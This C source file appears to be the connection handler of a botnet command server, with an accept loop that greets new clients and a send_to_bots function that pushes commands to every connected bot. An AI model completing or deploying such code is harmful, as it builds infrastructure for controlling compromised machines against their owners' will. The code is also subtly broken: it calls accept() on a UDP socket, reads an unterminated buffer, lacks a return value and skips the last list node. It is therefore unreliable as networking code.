#include "conn_handler.h"

extern CONNS cons;
extern int msg_pipe[2];

int make_socket(void)
{
	int s;
	if((s = socket(AF_INET, SOCK_DGRAM, 0)) == ERROR)	{
		perror("Failed to create socket");
		exit(1);
	}
	return s;
}

void *accept_handler(void *arg)
{
	int *p_main_sock = (int *) arg;
	int main_sock = *p_main_sock;
	struct connections *connects = &cons;
	int client_sock;
	char msg[7];
	while(1){
		int addrlen = sizeof(struct sockaddr);
		if((client_sock = accept(main_sock, (struct sockaddr *)&connects->client_conn, &addrlen)) != ERROR){
			connects->sock = client_sock;
			fprintf(stdout, "[+] New Connection from : %s\n", inet_ntoa(connects->client_conn.sin_addr));
			sendto(client_sock, "STARTED", 7, 0, (struct sockaddr *)&connects->client_conn , sizeof(struct sockaddr));
			connects = connects->next;
		}
		// we need a Exit Call Protocol
		read(msg_pipe[0], msg, 5);
		if(!strncmp(msg, "EXIT", 5)){
			break;
		}
		fprintf(stdout, "%s\n", msg);
	}
}

void send_to_bots(char *data)
{
	struct connections *connects = &cons;
	while(connects->next != NULL){
		sendto(connects->sock, data, strlen(data), 0, (struct sockaddr *)&connects->client_conn, sizeof(struct sockaddr));
		connects = connects->next;
	}
}

void bind_socket(int sock, short port, char *ip)
{
	struct sockaddr_in serverAddr;

	serverAddr.sin_family = AF_INET;
	serverAddr.sin_port = htons(port);
	serverAddr.sin_addr.s_addr = inet_addr(ip);
	memset(serverAddr.sin_zero, '\0', sizeof serverAddr.sin_zero);
	if (bind(sock, (struct sockaddr *)&serverAddr, sizeof(struct sockaddr)) == ERROR){
		perror("Failed to bind the Socket");
		exit(1);
	}
}

void close_socket(int sock_)
{
	close(sock_);
}